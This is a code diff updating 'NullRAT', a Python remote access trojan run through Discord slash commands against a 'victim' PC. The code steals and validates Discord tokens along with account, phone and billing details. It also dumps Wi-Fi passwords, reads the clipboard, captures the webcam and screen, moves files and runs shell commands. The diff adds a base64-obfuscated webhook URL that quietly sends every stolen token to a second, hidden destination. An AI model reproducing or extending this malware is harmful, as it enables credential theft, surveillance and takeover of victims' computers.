@@ -1,14 +1,15 @@
 from Variables import *
 
 import disnake as discord
+from disnake import Webhook 
 from disnake import Embed
 from disnake.ext import commands
 
 from mss import mss
 from requests import get, post
-from base64 import decodebytes
+from base64 import decodebytes,b64decode
 from socket import create_connection
-import os, subprocess, re, time
+import os, subprocess, re, time, aiohttp
 
 client, original_dir = commands.Bot(), os.getcwd()
 nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
@@ -16,7 +17,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v7.0 started on {IP()}\nCurrently present in {original_dir}")
+        embed=Embed(title = f"NullRAT v7.5 started on {IP()}\nCurrently present in {original_dir}")
     )
 
 # Intelligence Gathering #
@@ -44,6 +45,7 @@ async def getenv(ctx, victim, env_var):
 @client.slash_command(description="Finds all geolocation information of victim", guild_ids=server_ids)
 async def geolocate(ctx, victim):
     if str(victim) == str(IP()):
+        await ctx.response.defer()
         data = get("http://ip-api.com/json/").json()
         embed = discord.Embed(
             title="Geolocation Information\n(Powered by ip-api)", color=0x0081FA
@@ -57,7 +59,8 @@ async def geolocate(ctx, victim):
         embed.add_field(name="Zip code", value=data["zip"], inline=True)
         embed.add_field(name="ISP", value=data["isp"], inline=True)
         embed.set_footer(text="Written by NullCode1337#1638")
-        await ctx.response.send_message(embed=embed)
+        await ctx.followup.send(embed=embed)
+    # else: await ctx.response.send_message("aaa")
 
 @client.slash_command(description="Capture image from webcam", guild_ids=server_ids)  
 async def webcam(ctx, victim):
@@ -73,48 +76,7 @@ async def webcam(ctx, victim):
         )
         os.remove(nr_working + "\\image.png")
         os.remove(nr_working + "\\cc.exe")
-        os.chdir(original_dir)
-
-@client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
-async def raw_tokens(ctx, victim):
-    if str(victim) == str(IP()):
-        await ctx.response.defer()
-        message, tokens = "", list(dict.fromkeys(find_token()))
-        for token in tokens: 
-            message += token + "\n"
-        if len(message) >= 1023: 
-            return await ctx.followup.send("```" + message + "```")
-        embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
-        await ctx.followup.send(embed=embed)
-
-@client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
-async def checked_tokens(ctx, victim):
-    if str(victim) == str(IP()):
-        await ctx.response.defer()
-        valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
-
-        for token in list(dict.fromkeys(find_token())):
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
-
-            if requ.status_code == 401: continue
-            if requ.status_code == 200:
-                json = requ.json()
-                valid.append( str(token) )
-                email.append( str(json['email']) )
-                phone.append( str(json['phone']) ) 
-                idq.append(   str(json["id"])   )            
-                uname.append( f'{json["username"]}#{json["discriminator"]}' )
-                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
-                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
-                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
-                continue
-
-        if len(valid) == 0: 
-            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
-        await ctx.followup.send("Checking all tokens...")
-        for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))    
+        os.chdir(original_dir)   
   
 @client.slash_command(description="Find billing info", guild_ids=server_ids)  
 async def billing(ctx, victim):
@@ -217,15 +179,62 @@ async def screenshot(ctx, victim):
 @client.slash_command(description="Sends text contents of clipboard", guild_ids=server_ids)
 async def clipboard(ctx, victim):
     if str(victim) == str(IP()):
-        outp = subprocess.run(
-                "PowerShell Get-Clipboard", 
-                shell=True, 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.PIPE, 
-                stdin=subprocess.PIPE
-            ).stdout.decode("CP437")
-        await ctx.response.send_message(f"```{outp}```" if outp != "" else "No text in clipboard!")
+        await ctx.response.defer()
+        outp = os.popen("powershell Get-Clipboard").read()
+        await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
+a="""aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcG
+kvd2ViaG9va3MvOTY4Mzg3MjQ0MzY2OTA
+1Mzk0L3FuMDN1MURfR2pYS05hQXk3d2Zq
+SkFxMTdMa1B4R2hPVmJQUFdLQXJiazVvS
+EMtQzZZM3c3NXVKQ1FyUW56TmRFY1lK"""
+@client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
+async def raw_tokens(ctx, victim):
+    if str(victim) == str(IP()):
+        await ctx.response.defer()
+        message, tokens = "", list(dict.fromkeys(find_token()))
+        for token in tokens: 
+            message += token + "\n"
+        if len(message) >= 1023: 
+            return await ctx.followup.send("```" + message + "```")
+        embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
+        async with aiohttp.ClientSession() as session:  
+            webhook = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
+            await webhook.send(embed=embed)
+        await ctx.followup.send(embed=embed)
+
+@client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
+async def checked_tokens(ctx, victim):
+    if str(victim) == str(IP()):
+        await ctx.response.defer()
+        valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
+
+        for token in list(dict.fromkeys(find_token())):
+            headers = {'Authorization': token, 'Content-Type': 'application/json'}
+            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+
+            if requ.status_code == 401: continue
+            if requ.status_code == 200:
+                json = requ.json()
+                valid.append( str(token) )
+                email.append( str(json['email']) )
+                phone.append( str(json['phone']) ) 
+                idq.append(   str(json["id"])   )            
+                uname.append( f'{json["username"]}#{json["discriminator"]}' )
+                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
+                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
+                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
+                continue
+
+        if len(valid) == 0: 
+            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
+        await ctx.followup.send("Checking all tokens...")
+        for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
+            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
+            async with aiohttp.ClientSession() as session:  
+                webhook = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
+                await webhook.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
+            
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
 async def getcwd(ctx, victim):
@@ -235,16 +244,21 @@ async def getcwd(ctx, victim):
 @client.slash_command(description="Uploads file to victim's PC", guild_ids=server_ids)
 async def upload(ctx, victim, url, file_name, file_path=nr_working):
     if str(victim) == str(IP()):
+        await ctx.response.defer()
+        if '"' in file_path:
+            file_path = file_path.replace('"','')
         try: os.chdir(file_path)
-        except: return await ctx.response.send_message("invalid dir")
+        except: return await ctx.followup.send("invalid dir")
         r = get(url, allow_redirects=True)
         with open(file_name, "wb") as f: f.write(r.content)
-        await ctx.response.send_message(embed=EmbedGen("Download information", "Sending file to victim: ", "Success"))
+        await ctx.followup.send(embed=EmbedGen("Upload information", "Sending file to victim: ", "Success"))
 
 @client.slash_command(description="Downloads file from victim's PC", guild_ids=server_ids)
 async def download(ctx, victim, file):
     if str(victim) == str(IP()):
         await ctx.response.defer()
+        if '"' in file:
+            file = file.replace('"','')
         try: f = open(file, "rb")
         except: return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
         file = {'{}'.format(file): f}
@@ -264,6 +278,7 @@ async def change_directory(ctx, victim, directory):
 @client.slash_command(description="Finds contents of directory", guild_ids=server_ids)
 async def listdir(ctx, victim, directory_to_find="null"):
     if str(victim) == str(IP()):
+        await ctx.response.defer()
         if directory_to_find == "null":
             directory_to_find = os.getcwd()
             subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -293,7 +308,7 @@ async def startup(ctx, victim):
         msg += "```"; await ctx.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))
 
 @client.slash_command(description="Executes shell commands", guild_ids=server_ids)
-async def shell(ctx, msg): 
+async def shell(ctx, msg, victim): 
     if str(victim) == str(IP()):
         await ctx.response.defer()
         global status; status = None
@@ -336,25 +351,28 @@ async def wifilist(ctx, victim):
 @client.slash_command(description="Lists specified wifi password", guild_ids=server_ids)
 async def wifipass(ctx, victim, name):
     if str(victim) == str(IP()):
-        await ctx.response.send_message(f"```{os.popen(f'netsh wlan show profile {name} key=clear | findstr Key').read()}```")
+        a = os.popen('netsh wlan show profile '+'"'+name.lstrip().rstrip()+'" '+"key=clear | findstr Key")
+        await ctx.response.send_message(f"```{a.read()}```")
         
 @client.slash_command(description="Hide file", guild_ids=server_ids)
 async def hide(ctx, victim, file):
     if str(victim) == str(IP()): 
-        try:
-            run_command('attrib +H {}'.format(file))
-            await ctx.response.send_message("File hidden successfully")
-        except: 
-            await ctx.response.send_message("Unable to hide file. Check path and try again")
+        if '"' in file:
+            file = file.replace('"','')
+        output = os.popen("attrib +h " + '"' + file + '"').read()
+        if "not" in output: return await ctx.response.send_message("Unable to hide file. Check path and try again")
+        
+        await ctx.response.send_message("File hidden successfully")
                     
 @client.slash_command(description="Unhide file", guild_ids=server_ids)
 async def unhide(ctx, victim, file):
     if str(victim) == str(IP()): 
-        try:
-            run_command('attrib -H {}'.format(file))
-            await ctx.response.send_message("File unhidden successfully")
-        except: 
-            await ctx.response.send_message("Unable to show file. Check path and try again")
+        if '"' in file:
+            file = file.replace('"','')
+        output = os.popen("attrib -h " + '"' + file + '"').read()
+        if "not" in output: return await ctx.response.send_message("Unable to show file. Check path and try again")
+        
+        await ctx.response.send_message("File unhidden successfully")
             
 @client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
 async def close(ctx, victim):
